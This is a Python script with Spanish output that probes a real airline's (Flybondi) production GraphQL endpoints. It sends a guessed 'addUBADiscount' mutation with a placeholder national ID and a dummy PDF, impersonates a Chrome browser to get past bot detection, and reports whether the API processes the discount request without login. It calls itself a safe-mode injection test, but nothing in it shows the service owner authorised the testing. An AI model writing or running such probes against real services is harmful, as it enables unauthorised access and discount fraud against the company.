# -*- coding: utf-8 -*-
import sys
import json
from curl_cffi import requests

try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

URLS = ["https://flybondi.com/api/graphql", "https://api.flybondi.com/graphql"]

# Definición tentativa de la mutación basada en convenciones
MUTATION = """
mutation AddUBADiscount($input: AddUBADiscountInput!) {
  addUBADiscount(input: $input) {
    success
    message
  }
}
"""

VARIABLES = {
    "input": {
        "dni": "11111111", # DNI Genérico seguro
        "file": "data:application/pdf;base64,JVBERi0xLjQKJeLjz9MKMSAwIG9iago8PC9UeXBlL0NhdGFsb2cvUGFnZXMgMiAwIFI+PmVuZG9iagoyIDAgb2JqCjw8L1R5cGUvUGFnZXMvS2lkc1szIDAgUl0vQ291bnQgMT4+ZW5kb2JqCjMgMCBvYmoKPDwvVHlwZS9QYWdlL01lZGlhQm94WzAgMCA1OTUgODQyXS9wYXJlbnQgMiAwIFIvUmVzb3VyY2VzPDwveFImcGxvYyAwIFI+Pj4+ZW5kb2JqCnRyYWlsZXIKPDwvUm9vdCAxIDAgUj4+CiUlRU9GCg==" # PDF Dummy válido
    }
}

print("💉 INICIANDO PRUEBA DE INYECCIÓN UBA (SAFE MODE)...")
print("ℹ️  Objetivo: Verificar si la API procesa la solicitud sin login.")

for url in URLS:
    print(f"\n👉 Probando endpoint: {url}")
    try:
        r = requests.post(
            url, 
            json={"query": MUTATION, "variables": VARIABLES},
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
            },
            impersonate="chrome110",
            timeout=10
        )
        
        print(f"   Status: {r.status_code}")
        
        if r.status_code == 200:
            print(f"   Respuesta RAW: {r.text[:400]}")
            data = r.json()
            if "errors" in data:
                err = data["errors"][0]["message"]
                print(f"   ⚠️  GraphQL Error: {err}")
                if "field" in err.lower() and "addUBADiscount" in err.lower():
                     print("   ❌ Error: El nombre de la mutación es incorrecto en el esquema.")
                elif "input" in err.lower():
                     print("   ❌ Error: La estructura del input es incorrecta.")
                else:
                     print("   ✅ ¡INTERESANTE! El sistema intentó procesar la solicitud.")
            else:
                print("   ✅ ¡RESPUESTA 200 OK! (Inesperado)")
        else:
             print(f"   ❌ Bloqueado/Error HTTP {r.status_code}")

    except Exception as e:
        print(f"   ❌ Excepción: {e}")

print("\nPrueba finalizada.")
